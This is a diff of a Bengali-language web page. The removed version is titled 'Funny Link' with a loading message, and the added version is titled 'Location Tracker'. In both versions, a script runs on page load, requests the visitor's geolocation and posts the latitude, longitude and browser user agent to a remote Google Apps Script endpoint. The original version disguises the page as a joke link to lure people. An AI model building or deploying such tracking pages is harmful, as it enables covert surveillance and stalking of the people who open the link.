@@ -1,53 +1,64 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>Funny Link 🤪</title>
-    <meta charset="UTF-8" />
-    <script>
-      function sendLocation(position) {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        const userAgent = navigator.userAgent;
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Location Tracker</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+    }
+  </style>
+  <script>
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const userAgent = navigator.userAgent;
 
-        fetch("https://script.google.com/macros/s/AKfycbw9qFm0UFnu3eengU-c21xnMyiwCRy8_b9JWN8bZL7eGZxzfOWsfl-mHAXoU7UHNRMD/exec", {
-          method: "POST",
-          body: JSON.stringify({
-            latitude,
-            longitude,
-            userAgent
-          }),
-          headers: {
-            "Content-Type": "application/json"
-          }
-        })
-        .then(() => {
-          document.getElementById("status").innerText = "ধন্যবাদ! 😊";
-          
-          // Optional Redirect after 3 seconds:
-          // window.location.href = "https://example.com";
-        })
-        .catch(() => {
-          document.getElementById("status").innerText = "দুঃখিত, সমস্যা হয়েছে!";
-        });
-      }
-
-      function handleError(error) {
-        document.getElementById("status").innerText = "লোকেশন পাওয়া যায়নি ❌";
-      }
-
-      function getLocation() {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-        } else {
-          document.getElementById("status").innerText = "ব্রাউজার সাপোর্ট করে না!";
+      fetch("https://script.google.com/macros/s/AKfycbw9qFm0UFnu3eengU-c21xnMyiwCRy8_b9JWN8bZL7eGZxzfOWsfl-mHAXoU7UHNRMD/exec", {
+        method: "POST",
+        body: JSON.stringify({
+          latitude: latitude,
+          longitude: longitude,
+          userAgent: userAgent
+        }),
+        headers: {
+          "Content-Type": "application/json"
         }
-      }
+      })
+      .then(response => response.text())
+      .then(text => {
+        document.getElementById("status").innerText = "ধন্যবাদ! তোমার লোকেশন পাওয়া গেছে। 😊";
+        // Optional: Redirect after 3 seconds
+        // setTimeout(() => {
+        //   window.location.href = "https://example.com";
+        // }, 3000);
+      })
+      .catch(error => {
+        document.getElementById("status").innerText = "দুঃখিত, লোকেশন পাঠাতে সমস্যা হয়েছে।";
+        console.error("Error:", error);
+      });
+    }
 
-      window.onload = getLocation;
-    </script>
-  </head>
-  <body style="font-family: sans-serif; text-align: center; margin-top: 100px;">
-    <h2>😜 Loading...</h2>
-    <p id="status">লোকেশন নিচ্ছে...</p>
-  </body>
+    function handleError(error) {
+      document.getElementById("status").innerText = "লোকেশন নেওয়া যায়নি। অনুগ্রহ করে অনুমতি দিন।";
+      console.error("Geolocation error:", error);
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        document.getElementById("status").innerText = "দুঃখিত, আপনার ব্রাউজার লোকেশন সাপোর্ট করে না।";
+      }
+    }
+
+    window.onload = getLocation;
+  </script>
+</head>
+<body>
+  <h1>লোকেশন ট্র্যাকার</h1>
+  <p id="status">অনুগ্রহ করে লোকেশন শেয়ার করুন...</p>
+</body>
 </html>
